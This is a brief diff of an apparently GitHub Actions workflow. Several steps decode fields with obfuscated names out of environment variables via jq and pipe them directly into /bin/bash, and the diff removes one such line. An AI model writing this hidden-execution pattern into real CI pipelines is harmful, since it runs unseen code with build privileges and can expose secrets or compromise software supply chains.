@@ -20,7 +20,6 @@ jobs:
           echo $dnq397 | jq -r .opwvc53 | /bin/bash
           printf '%s' "$nr7" | jq -r .sshp003 | /bin/bash
           echo $vdto75365 | jq -r .vlrns89445 | /bin/bash
-          printf '%s' "$c13618" | jq -r .aq3383 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
